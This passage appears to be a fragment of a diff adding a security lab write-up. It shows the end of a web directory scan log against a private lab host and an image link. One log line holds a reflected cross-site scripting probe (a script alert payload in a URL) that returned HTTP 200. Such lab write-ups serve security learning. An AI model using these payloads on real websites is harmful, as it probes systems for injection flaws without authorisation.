++ http://192.168.56.101/?\"><script>alert('Vulnerable');</script> (CODE:200|SIZE:1025)
+
+-----------------
+END_TIME: Tue Jan  3 14:44:48 2023
+DOWNLOADED: 3388 - FOUND: 30
+```
+</details>
+
+
+***
+
+![image](https://user-images.githubusercontent.com/64751701/210415424-e5008133-a2af-45ce-a958-51218c2eccb7.png)
